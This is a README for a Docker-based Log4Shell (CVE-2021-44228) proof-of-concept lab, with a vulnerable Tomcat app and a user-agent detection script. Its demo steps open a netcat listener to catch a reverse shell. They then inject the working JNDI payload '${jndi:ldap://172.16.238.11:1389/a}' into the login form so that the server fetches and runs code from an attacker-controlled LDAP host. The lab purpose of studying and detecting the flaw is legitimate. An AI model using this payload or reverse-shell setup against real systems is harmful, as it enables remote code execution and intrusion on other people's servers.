# log4j-poc

## An LDAP RCE exploit for CVE-2021-44228 Log4Shell 

### Description

This demo Tomcat 8 server has a vulnerable app deployed on it and is also vulnerable via user-agent attacks.

The remote exploit app in this demo is based on that found at https://github.com/kozmer/log4j-shell-poc

This demo tomcat server has been reconfigued to use Log4J2 for logging - a non-standard configuration.

The detection script will check for user-agent vulnerablities and is from here: https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6
 

### Prerequisites

This code requires Docker and Docker Compose

### Installation

``` 
git clone https://github.com/cyberxml/log4j-poc
cd log4j-poc
# edit docker-compose.yml to addjust the environment variables as needed.
#   POC_ADDR is the address of the cve-poc container
#   LISTENER_ADDR is the address of the 'nc' listener e.g. the docker host
# The listener IP address is the address of the machine on which you will run the netcat 'nc' listener
# This can be the local IP of the docker hostmachine.
docker-compose build
```

### Run Web App Attack Demo

1. Setup your docker listener in the first terminal
    1. `nc -lv 10.10.10.31 9001`
1. Start the docker containers in a second terminal
    1. `docker-compose up`
1. Navigate to the web app on port 8080
    1. Navigate to http://10.10.10.31:8080/log4shell
        1. Enter the username: `admin`
        1. Enter the password: `password`
        1. Select the "login" button
        1. See the welcome screen 
    1. Return to login at http://10.10.10.31:8080/log4shell
        1. Enter the username `${jndi:ldap://172.16.238.11:1389/a}`
        1. Select the "login" button
        1. Check for connection on your `nc` listener

### Run Web App Attack Demo

1. Setup your docker listener in the first terminal
    1. `nc -lv 10.10.10.31 9001`
1. Start the docker containers in a second terminal
    1. `docker-compose up`
1. In a third terminal, run the following. The IP is the ip address of the docker host
    1. `python3 log4j_rce_check.py http://10.10.10.31:8080/log4shell --attacker-host 10.10.10.31:11389 --timeout=2`

### Detect UA Vulnerability
1. cd scripts
1. `python3 log4j_rce_check.py http://10.10.10.31:8080/log4shell --attacker-host 10.10.10.31:11389 --timeout=2`
1. you will have to kill the process, not sure yet why this hangs
